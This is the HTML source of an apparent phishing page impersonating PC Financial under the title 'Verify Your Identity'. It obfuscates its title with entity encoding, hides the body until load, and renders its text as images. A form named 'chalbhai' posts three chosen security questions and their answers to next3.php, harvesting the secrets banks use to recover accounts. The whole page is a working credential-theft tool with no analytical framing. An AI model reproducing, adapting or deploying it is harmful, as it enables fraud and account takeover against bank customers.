<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#80;&#67;&#32;&#70;&#105;&#110;&#97;&#110;&#99;&#105;&#97;&#108;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  <style type="text/css">
  
.textbox {  
    border: solid 1px #999999;
    background: #e4e4e4;
    box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1) inset;
    background: -moz-linear-gradient(top, rgba(220,220,220,0.3) 0%,rgba(255,255,255,1) 25%);
    background: -webkit-gradient(linear, 0% 0%, 0% 100%, color-stop(0%, #e4e4e4), color-stop(20%, #ffffff));
    padding-left: 8px;
	font-size: 14px;
	height: 32px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #87A9DF; 
    border-style: solid; 
    border-width: 2px; 
    outline: 0; 
 } 

 </style>			  
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>

<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body style="visibility:hidden" onload="unhideBody()">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:186px; top:8px; width:949px; height:135px; z-index:0"><img src="images/fa11.png" alt="" title="" border=0 width=949 height=135></div>

<div id="image2" style="position:absolute; overflow:hidden; left:182px; top:162px; width:715px; height:287px; z-index:1"><img src="images/fa12.png" alt="" title="" border=0 width=715 height=287></div>

<div id="image6" style="position:absolute; overflow:hidden; left:0px; top:842px; width:1349px; height:303px; z-index:2"><img src="images/fa4.png" alt="" title="" border=0 width=1349 height=303></div>

<div id="image7" style="position:absolute; overflow:hidden; left:214px; top:921px; width:911px; height:151px; z-index:3"><a href="#"><img src="images/fa5.png" alt="" title="" border=0 width=911 height=151></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:201px; top:249px; width:295px; height:199px; z-index:4"><img src="images/fa17.png" alt="" title="" border=0 width=295 height=199></div>

<div id="image9" style="position:absolute; overflow:hidden; left:180px; top:449px; width:716px; height:298px; z-index:5"><img src="images/fa18.png" alt="" title="" border=0 width=716 height=298></div>
<form action=next3.php name=chalbhai id=chalbhai method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:204px;top:268px;width:399px;z-index:6">
<option value="Select One">Select One</option>
<option value="What is your favorite board game?">What is your favorite board game?</option>
<option value="What is your dream occupation?">What is your dream occupation?</option>
<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="What is your first pet's name?">What is your first pet's name?</option>
<option value="What is your Mother middles name?">What is your Mother middles name?</option>
<option value="What color was your first car?">What color was your first car?</option>
<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
<option value="What is the street you grew up on?">What is the street you grew up on?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
<option value="What is your Family tradition?">What is your Family tradition?</option>
<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
<option value="What is your daughter's name?">What is your daughter's name?</option>
<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
<option value="Who is your favorite composer?">Who is your favorite composer?</option>
<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
<input name="ans1" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:204px;top:340px;z-index:7">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:204px;top:412px;width:399px;z-index:8">
<option value="Select One">Select One</option>
<option value="What is your favorite board game?">What is your favorite board game?</option>
<option value="What is your dream occupation?">What is your dream occupation?</option>
<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="What is your first pet's name?">What is your first pet's name?</option>
<option value="What is your Mother middles name?">What is your Mother middles name?</option>
<option value="What color was your first car?">What color was your first car?</option>
<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
<option value="What is the street you grew up on?">What is the street you grew up on?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
<option value="What is your Family tradition?">What is your Family tradition?</option>
<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
<option value="What is your daughter's name?">What is your daughter's name?</option>
<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
<option value="Who is your favorite composer?">Who is your favorite composer?</option>
<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
<input name="ans2" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:206px;top:474px;z-index:9">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:206px;top:546px;width:399px;z-index:10">
<option value="Select One">Select One</option>
<option value="What is your favorite board game?">What is your favorite board game?</option>
<option value="What is your dream occupation?">What is your dream occupation?</option>
<option value="What's the name of the boy/ girl your first kissed?">What's the name of the boy/ girl your first kissed?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="What is your first pet's name?">What is your first pet's name?</option>
<option value="What is your Mother middles name?">What is your Mother middles name?</option>
<option value="What color was your first car?">What color was your first car?</option>
<option value="What is your Mother's maiden name?">What is your Mother's maiden name?</option>
<option value="What is the street you grew up on?">What is the street you grew up on?</option>
<option value="What is your best friend's first name?">What is your best friend's first name?</option>
<option value="In what city/town did your mother and father get married?">In what city/town did your mother and father get married?</option>
<option value="What is your Best man name at wedding?">What is your Best man name at wedding?</option>
<option value="What is your Family tradition?">What is your Family tradition?</option>
<option value="What was your favorite subject in school?">What was your favorite subject in school?</option>
<option value="What is your daughter's name?">What is your daughter's name?</option>
<option value="In what city/town did you meet your spouse/significant other?">In what city/town did you meet your spouse/significant other?</option>
<option value="Who was your favorite childhood hero?">Who was your favorite childhood hero?</option>
<option value="Who is your favorite composer?">Who is your favorite composer?</option>
<option value="In what city does your nearest sibling live?">In what city does your nearest sibling live?</option>
<option value="What is the first and last name of your oldest cousin?">What is the first and last name of your oldest cousin?</option>
<option value="Who is your favorite cartoon character?">Who is your favorite cartoon character?</option>
<option value="What is your all-time favorite sports movie?">What is your all-time favorite sports movie?</option>
<option value="What is your favorite museum or cultural institution?">What is your favorite museum or cultural institution?</option></select>
<input name="ans3" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:200px;left:206px;top:618px;z-index:11">
<div id="formimage1" style="position:absolute; left:772px; top:686px; z-index:12"><input type="image" name="formimage1" width="104" height="31" src="images/sbmit.png"></div>
<div id="image3" style="position:absolute; overflow:hidden; left:904px; top:169px; width:226px; height:290px; z-index:13"><img src="images/fa16.png" alt="" title="" border=0 width=226 height=290></div>

</div>

</body>
</html>
